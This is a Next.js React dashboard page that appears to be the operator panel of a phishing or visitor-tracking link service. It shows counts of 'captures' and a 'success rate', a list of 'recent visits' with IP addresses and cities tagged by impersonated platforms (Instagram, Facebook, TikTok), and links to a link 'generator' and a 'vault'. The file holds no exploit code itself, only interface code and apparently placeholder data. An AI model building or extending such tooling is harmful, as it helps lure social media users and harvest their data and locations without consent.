"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function HomePage() {
  const [userName, setUserName] = useState("Admin");
  const [userId, setUserId] = useState("");
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedName = localStorage.getItem("aura_user_name");
      const storedId = localStorage.getItem("aura_user_id");
      if (storedName) setUserName(storedName);
      if (storedId) setUserId(storedId);
    }
  }, []);

  const handleLogout = () => {
    localStorage.removeItem("aura_gateway_cleared_v1");
    localStorage.removeItem("aura_user_name");
    localStorage.removeItem("aura_user_id");
    router.push("/");
  };

  const stats = [
    { label: "Total Links", value: "12", icon: "🔗" },
    { label: "Total Captures", value: "148", icon: "🎯" },
    { label: "Active Tools", value: "5", icon: "🛠️" },
    { label: "Success Rate", value: "92%", icon: "📈" }
  ];

  return (
    <div className="main-container animate-fade-in py-6 sm:py-12">
      <header className="mb-8 sm:mb-12 flex flex-col sm:flex-row sm:items-center justify-between gap-6">
        <div>
          <h1 className="text-2xl sm:text-4xl font-bold mb-2 tracking-tight">Welcome back, <span className="text-gradient capitalize">{userName}</span></h1>
          <p className="text-slate-500 text-xs sm:text-sm font-medium">See your activity and recent visitors here.</p>
          {userId && (
            <div className="mt-3 inline-flex items-center gap-2 bg-indigo-50 border border-indigo-100 px-3 py-1.5 rounded-xl shadow-sm">
              <span className="text-[9px] sm:text-[10px] font-black text-indigo-400 uppercase tracking-[0.2em]">UID:</span>
              <span className="text-xs font-bold font-mono text-indigo-600">{userId}</span>
            </div>
          )}
        </div>
        <button 
          onClick={handleLogout}
          className="bg-white/60 hover:bg-white text-slate-900 border border-white/50 px-5 py-3 rounded-xl sm:rounded-2xl text-xs sm:text-sm font-bold transition-all flex items-center justify-center gap-3 shadow-sm hover:shadow-md active:scale-95 glass"
        >
          <span>Logout Session</span>
          <span className="text-lg">🚪</span>
        </button>
      </header>

      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-8 sm:mb-12">
        {stats.map((stat, i) => (
          <div key={i} className="glass-card p-4 sm:p-6 rounded-2xl sm:rounded-[2rem] relative overflow-hidden group hover:scale-[1.02] transition-all">
            <div className="absolute top-0 right-0 w-20 h-20 sm:w-24 sm:h-24 bg-indigo-500/5 rounded-full -mr-6 -mt-6 group-hover:bg-indigo-500/10 transition-colors"></div>
            <div className="flex items-center justify-between mb-3 sm:mb-4 relative z-10">
              <span className="text-2xl sm:text-3xl filter drop-shadow-sm">{stat.icon}</span>
              <span className="text-[8px] sm:text-[10px] font-black text-emerald-600 bg-emerald-50 px-2 py-0.5 sm:px-2.5 sm:py-1 rounded-full border border-emerald-100">+12%</span>
            </div>
            <h3 className="text-slate-400 text-[9px] sm:text-xs font-black uppercase tracking-widest mb-0.5 sm:mb-1 relative z-10">{stat.label}</h3>
            <p className="text-xl sm:text-3xl font-black text-slate-900 tracking-tight relative z-10">{stat.value}</p>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8">
        <div className="lg:col-span-2 glass-card p-5 sm:p-8 rounded-2xl">
            <div className="flex items-center justify-between mb-6">
            <h2 className="text-lg sm:text-xl font-bold text-slate-900">Recent Visits</h2>
            <div className="flex items-center gap-2">
              <span className="w-1.5 h-1.5 sm:w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
              <span className="text-[10px] sm:text-xs text-emerald-600 font-bold uppercase tracking-tighter">Online</span>
            </div>
          </div>
          <div className="space-y-5 sm:space-y-6">
            {[
              { id: 1, ip: "103.1.205.118", tool: "Instagram", time: "just now", loc: "Karachi, PK" },
              { id: 2, ip: "92.118.1.15", tool: "Facebook", time: "12 mins ago", loc: "Marseille, FR" },
              { id: 3, ip: "172.16.2.22", tool: "TikTok", time: "1 hour ago", loc: "London, UK" }
            ].map((target) => (
              <div key={target.id} className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-100 pb-4 last:border-0 last:pb-0">
                <div className="flex items-center gap-3 sm:gap-4">
                  <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-lg sm:rounded-xl bg-gradient-to-br from-indigo-500 to-purple-500 flex items-center justify-center text-[10px] sm:text-xs font-bold text-white shadow-md">
                    USR
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                       <p className="text-sm font-bold text-slate-800">{target.ip}</p>
                       <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-50 text-slate-500 font-mono border border-slate-100">{target.loc}</span>
                    </div>
                    <p className="text-[10px] sm:text-xs text-slate-400 font-medium">{target.tool} • {target.time}</p>
                  </div>
                </div>
                <a href="/vault" className="text-xs font-bold py-2 sm:py-2.5 px-4 sm:px-5 bg-slate-50 hover:bg-indigo-600 hover:text-white rounded-lg sm:rounded-xl text-indigo-600 transition-all text-center border border-slate-100">Details</a>
              </div>
            ))}
          </div>
        </div>

        <div className="glass-card p-6 sm:p-8 rounded-2xl bg-gradient-to-br from-indigo-50/50 to-blue-50/50 border-blue-100/50">
          <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 text-slate-900">Quick Link</h2>
          <p className="text-xs sm:text-sm text-slate-500 mb-6 leading-relaxed">Use any template to create your link in one click.</p>
          <a href="/generator" className="block w-full py-3.5 sm:py-4 bg-indigo-600 hover:bg-indigo-700 text-white text-center rounded-xl font-bold transition-all shadow-lg shadow-indigo-500/20 glow-button text-sm">
            Go to Generator
          </a>
        </div>
      </div>
    </div>
  );
}
